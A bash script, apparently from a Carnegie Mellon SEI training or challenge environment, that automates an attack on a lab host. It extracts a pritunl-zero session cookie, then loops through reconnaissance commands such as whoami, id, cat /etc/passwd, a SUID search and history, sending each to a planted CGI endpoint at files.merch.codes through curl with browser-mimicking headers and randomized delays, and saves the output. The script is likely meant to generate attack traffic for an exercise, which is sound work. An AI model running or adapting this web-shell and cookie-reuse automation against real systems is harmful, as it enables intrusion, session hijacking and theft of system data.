#!/bin/bash

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


sleep 165
/home/user/clicker.sh
/home/user/clicker.sh

# Define a function to run convert_cookies.py and assign the cookie variable
run_convert_cookies() {
  /home/user/clicker.sh
  /home/user/convert_cookies.py
  cookie=$(cat /home/user/cookies.txt | grep pritunl | rev | cut -d $'\t' -f1 | rev)
}

# Run convert_cookies.py initially
run_convert_cookies

# Re-run convert_cookies.py if the cookie variable is blank
while [[ -z "$cookie" ]]; do
  sleep 15
  run_convert_cookies
done

/home/user/curler.sh &
sleep 15
/home/user/curler-cgi.sh

# List of commands to execute
commands=(
  "whoami"
  "id"
  "pwd"
  "ls"
  "uname -a"
  "cat /etc/passwd"
  "ip a"
  "ps aux"
  "who"
  "cat /etc/os-release"
  "find / -perm +4000"
  "history"
  "df -h"
  "du -h"
  # Add more commands here, if you want to...
)

for command in "${commands[@]}"; do
  curl -k "https://files.merch.codes/cgi-bin/${cgi_filename}.cgi?${command}" \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \
    -H "Accept-Language: en-US,en;q=0.5" \
    -H "Connection: keep-alive" \
    -H "Cookie: pritunl-zero=$cookie" \
    -H "Upgrade-Insecure-Requests: 1" \
    -H "Sec-Fetch-Dest: document" \
    -H "Sec-Fetch-Mode: navigate" \
    -H "Sec-Fetch-Site: none" \
    -H "Sec-Fetch-User: ?1" \
    -H "If-Modified-Since: Sat, 29 Apr 2023 03:25:27 GMT" \
    -H "If-None-Match: '52e-5fa7124130513-gzip'" \
    --output "/home/user/cgi-bin-query-${command}.html"
  delay=$((RANDOM % 5 + 3))
  sleep $delay
done

/home/user/final.sh
